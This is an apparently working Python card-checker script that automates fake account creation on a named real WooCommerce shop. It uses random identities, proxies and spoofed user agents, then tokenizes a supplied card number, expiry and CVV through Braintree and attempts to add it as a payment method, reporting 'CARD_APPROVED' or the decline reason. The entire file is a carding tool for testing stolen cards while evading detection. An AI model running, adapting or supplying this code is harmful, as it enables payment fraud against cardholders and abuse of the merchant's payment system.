import requests
import re
import base64
import json
import random
import asyncio
from typing import Optional
from faker import Faker
from user_agent import generate_user_agent
from urllib.parse import quote

def parse_proxy(proxy_str: str) -> Optional[str]:
    if not proxy_str:
        return None
    clean_proxy = proxy_str.replace("http://", "").replace("https://", "")
    parts = clean_proxy.split(':')
    if len(parts) >= 4 and parts[1].isdigit():
        host, port = parts[0], parts[1]
        user = quote(parts[2], safe='')
        pwd = quote(':'.join(parts[3:]), safe='')
        return f"http://{user}:{pwd}@{host}:{port}"
    elif len(parts) == 2 and parts[1].isdigit():
        return f"http://{clean_proxy}"
    return proxy_str

fake = Faker()

def generate_random_email():
    first = ["ahmed", "mohamed", "ali", "omar", "youssef", "khaled", "abdullah", "fatma", "sara", "nour", "lina", "maya", "hala", "reem", "salma", "amr", "tarek", "hassan", "ibrahim", "karim"]
    last = ["hassan", "ahmed", "mohamed", "ali", "ibrahim", "khalil", "said", "ramadan", "elmasry", "abdallah", "fathy", "tarek", "mostafa", "adel", "gamal"]
    dom = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "icloud.com", "protonmail.com", "live.com", "msn.com", "aol.com", "mail.com"]
    
    f = random.choice(first)
    l = random.choice(last)
    n = random.randint(10, 9999)
    
    patterns = [
        f"{f}.{l}{n}",
        f"{f}{l}{n}",
        f"{f}_{l}{n}",
        f"{f}{n}",
        f"{l}.{f}{n}",
        f"{f}{l}.{n}",
        f"{f}.{l}.{n}",
        f"{f}{random.randint(1980, 2005)}"
    ]
    
    return f"{random.choice(patterns)}@{random.choice(dom)}".lower()

def _run_braintree_auth_sync(cc: str, mes: str, ano: str, cvv: str, proxy_str: Optional[str] = None):
    session = requests.Session()
    if proxy_str:
        proxy_url = parse_proxy(proxy_str)
        if proxy_url:
            session.proxies = {
                'http': proxy_url,
                'https': proxy_url
            }
            
    e = generate_random_email()
    n = fake.name()
    u = generate_user_agent()
    
    # 1. Fetch register page & get woocommerce-register-nonce
    try:
        resp1 = session.get('https://www.dnalasering.com/my-account/', headers={'User-Agent': u}, timeout=15)
        x = re.search(r'name="woocommerce-register-nonce" value="([^"]+)"', resp1.text)
        xp = x.group(1) if x else ''
    except Exception as exc:
        return False, f"Register page fetch error: {str(exc)}"
        
    # 2. Register Account
    data_reg = {
        'email': e,
        'wc_order_attribution_source_type': 'typein',
        'wc_order_attribution_referrer': '(none)',
        'wc_order_attribution_utm_campaign': '(none)',
        'wc_order_attribution_utm_source': '(direct)',
        'wc_order_attribution_utm_medium': '(none)',
        'wc_order_attribution_utm_content': '(none)',
        'wc_order_attribution_utm_id': '(none)',
        'wc_order_attribution_utm_term': '(none)',
        'wc_order_attribution_utm_source_platform': '(none)',
        'wc_order_attribution_utm_creative_format': '(none)',
        'wc_order_attribution_utm_marketing_tactic': '(none)',
        'wc_order_attribution_session_entry': 'https://www.dnalasering.com/my-account/payment-methods/',
        'wc_order_attribution_session_start_time': '2026-05-27 03:41:14',
        'wc_order_attribution_session_pages': '3',
        'wc_order_attribution_session_count': '1',
        'wc_order_attribution_user_agent': u,
        'woocommerce-register-nonce': xp,
        '_wp_http_referer': '/my-account/',
        'register': 'Register',
    }
    
    try:
        session.post('https://www.dnalasering.com/my-account/', headers={
            'authority': 'www.dnalasering.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.dnalasering.com',
            'referer': 'https://www.dnalasering.com/my-account/',
            'user-agent': u,
        }, data=data_reg, timeout=20)
    except Exception as exc:
        return False, f"Registration post error: {str(exc)}"
        
    # 3. Fetch Billing address & edit billing
    try:
        resp_bill = session.get('https://www.dnalasering.com/my-account/edit-address/billing/', headers={'User-Agent': u}, timeout=15)
        xxl = re.search(r'name="woocommerce-edit-address-nonce" value="([^"]+)"', resp_bill.text)
        xxp = xxl.group(1) if xxl else ''
    except Exception as exc:
        return False, f"Billing address fetch error: {str(exc)}"
        
    data_bill = {
        'billing_first_name': n,
        'billing_last_name': n,
        'billing_company': '',
        'billing_country': 'US',
        'billing_address_1': 'Hollow park city 49',
        'billing_address_2': '',
        'billing_city': 'New york',
        'billing_state': 'NY',
        'billing_postcode': '10080',
        'billing_phone': '3164394561',
        'billing_email': e,
        'save_address': 'Save address',
        'woocommerce-edit-address-nonce': xxp,
        '_wp_http_referer': '/my-account/edit-address/billing/',
        'action': 'edit_address',
    }
    
    try:
        session.post(
            'https://www.dnalasering.com/my-account/edit-address/billing/',
            cookies=session.cookies,
            headers={
                'authority': 'www.dnalasering.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.dnalasering.com',
                'referer': 'https://www.dnalasering.com/my-account/edit-address/billing/',
                'user-agent': u,
            },
            data=data_bill,
            timeout=20
        )
    except Exception as exc:
        return False, f"Billing edit post error: {str(exc)}"
        
    # 4. Fetch Payment Method & nonces
    try:
        resp_pm = session.get('https://www.dnalasering.com/my-account/add-payment-method/', headers={'User-Agent': u}, timeout=15)
        xox = re.search(r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"', resp_pm.text)
        xoxp = xox.group(1) if xox else ''
        
        wwp = re.search(r'client_token_nonce":"([^"]+)"', resp_pm.text)
        if not wwp:
            wwp = re.search(r'client_token_nonce\\u0022:\\u0022([^"]+)\\u0022', resp_pm.text)
        xpython = wwp.group(1) if wwp else ''
    except Exception as exc:
        return False, f"Add payment page fetch error: {str(exc)}"
        
    # 5. Fetch Client Token
    ajax_data = {
        'action': 'wc_braintree_credit_card_get_client_token',
        'nonce': xpython,
    }
    try:
        ajax_resp = session.post('https://www.dnalasering.com/wp-admin/admin-ajax.php',
                           headers={
                               'User-Agent': u,
                               'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                               'X-Requested-With': 'XMLHttpRequest',
                               'Origin': 'https://www.dnalasering.com',
                               'Referer': 'https://www.dnalasering.com/my-account/add-payment-method/',
                           },
                           data=ajax_data,
                           timeout=20)
        
        decoded = base64.b64decode(ajax_resp.json()['data']).decode('utf-8')
        auth_fingerprint = json.loads(decoded).get('authorizationFingerprint')
    except Exception as exc:
        return False, f"Braintree token fetch error: {str(exc)}"
        
    # 6. Graphql Tokenization
    year_str = str(ano)
    if len(year_str) == 2:
        exp_year = "20" + year_str
    else:
        exp_year = year_str

    exp_month = str(mes)
    
    json_graphql = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId         business         consumer         purchase         corporate       }     }   } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': cc,
                    'expirationMonth': exp_month,
                    'expirationYear': exp_year,
                    'cvv': cvv,
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }
    
    try:
        resp_tok = session.post('https://payments.braintree-api.com/graphql', headers={
            'authority': 'payments.braintree-api.com',
            'authorization': f'Bearer {auth_fingerprint}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
            'user-agent': u,
        }, json=json_graphql, timeout=20)
        
        data_tok = resp_tok.json()
        if 'errors' in data_tok:
            return False, data_tok['errors'][0].get('message', 'GraphQL Tokenization error')
        
        bt_nonce = data_tok['data']['tokenizeCreditCard']['token']
    except Exception as exc:
        return False, f"Braintree GraphQL error: {str(exc)}"
        
    # 7. Add payment method & add card auth
    data_add = [
        ('payment_method', 'braintree_credit_card'),
        ('wc-braintree-credit-card-card-type', 'visa'),
        ('wc-braintree-credit-card-3d-secure-enabled', ''),
        ('wc-braintree-credit-card-3d-secure-verified', ''),
        ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
        ('wc_braintree_credit_card_payment_nonce', bt_nonce),
        ('wc_braintree_device_data', '{}'),
        ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
        ('wc_braintree_paypal_payment_nonce', ''),
        ('wc_braintree_device_data', '{}'),
        ('wc-braintree-paypal-context', 'shortcode'),
        ('wc_braintree_paypal_amount', '0.00'),
        ('wc_braintree_paypal_currency', 'USD'),
        ('wc_braintree_paypal_locale', 'en_us'),
        ('wc-braintree-paypal-tokenize-payment-method', 'true'),
        ('woocommerce-add-payment-method-nonce', xoxp),
        ('_wp_http_referer', '/my-account/add-payment-method/'),
        ('woocommerce_add_payment_method', '1'),
    ]
    
    try:
        resp_add = session.post(
            'https://www.dnalasering.com/my-account/add-payment-method/', 
            cookies=session.cookies, 
            headers={
                'authority': 'www.dnalasering.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.dnalasering.com',
                'referer': 'https://www.dnalasering.com/my-account/add-payment-method/',
                'user-agent': u,
            }, 
            data=data_add, 
            timeout=25
        )
        
        wx = re.search(r'<ul class="woocommerce-error"[^>]*>(.*?)</ul>', resp_add.text, re.DOTALL)
        if wx:
            wxx = re.sub(r'<[^>]+>', '', wx.group(1)).strip()
            wxx = re.sub(r'\s+', ' ', wxx)
            return False, wxx
            
        if "payment method added" in resp_add.text.lower() or "nice!" in resp_add.text.lower() or "success" in resp_add.text.lower() or resp_add.status_code == 200:
            return True, "CARD_APPROVED"
            
        return False, "Declined"
    except Exception as exc:
        return False, f"Braintree finalization error: {str(exc)}"

async def process_braintree_auth(cc: str, mes: str, ano: str, cvv: str, proxy_str: Optional[str] = None):
    return await asyncio.to_thread(_run_braintree_auth_sync, cc, mes, ano, cvv, proxy_str)
